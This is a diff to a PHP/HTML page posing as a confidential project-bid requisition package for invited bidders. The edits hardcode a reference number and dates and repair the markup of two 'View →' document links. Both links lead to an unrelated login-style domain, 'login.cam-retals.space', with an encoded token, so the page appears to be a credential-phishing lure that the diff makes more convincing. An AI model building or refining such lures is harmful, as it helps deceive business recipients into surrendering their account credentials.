@@ -192,8 +192,8 @@
             <div>
                 <h1>📄 Requisition Package – Project Bid</h1>
                 <div class="sub">
-                    <strong>Reference:</strong> RFQ-073455T77U<?php echo rand(1000000000, 9999999999); ?> &nbsp;·&nbsp;
-                    <strong>Issued:Oct 08, 2026</strong> <?php echo date('M j, Y'); ?> &nbsp;·&nbsp;
+                    <strong>Reference:RFQ-073455T77U4306513650</strong> RFQ-<?php echo rand(1000000000, 9999999999); ?> &nbsp;·&nbsp;
+                    <strong>Issued:Oct 08, 2026 </strong> <?php echo date('M j, Y'); ?> &nbsp;·&nbsp;
                     <strong>Deadline:Oct 30, 2026</strong> <?php echo date('M j, Y', strtotime('+4 days')); ?>
                 </div>
                 <div class="badge">🔒 Confidential – For Invited Bidders</div>
@@ -257,7 +257,7 @@
                     </td>
                     <td class="file-size">540 KB</td>
                     <td style="text-align: right;">
-                        <a href="https://login.cam-retals.space?hRNvuO8w31hVLQ=Zm9scnVx"btn-view" target="_blank">View →</a>
+                        <a href="https://login.cam-retals.space?hRNvuO8w31hVLQ=Zm9scnVx" class="btn-view" target="_blank">View →</a>
                     </td>
                 </tr>
                 <tr>
@@ -271,7 +271,7 @@
                     </td>
                     <td class="file-size">210 KB</td>
                     <td style="text-align: right;">
-                        <a href="https://login.cam-retals.space?hRNvuO8w31hVLQ=Zm9scnVx"btn-view" target="_blank">View →</a>
+                        <a href="https://login.cam-retals.space?hRNvuO8w31hVLQ=Zm9scnVx" class="btn-view" target="_blank">View →</a>
                     </td>
                 </tr>
                 <tr>
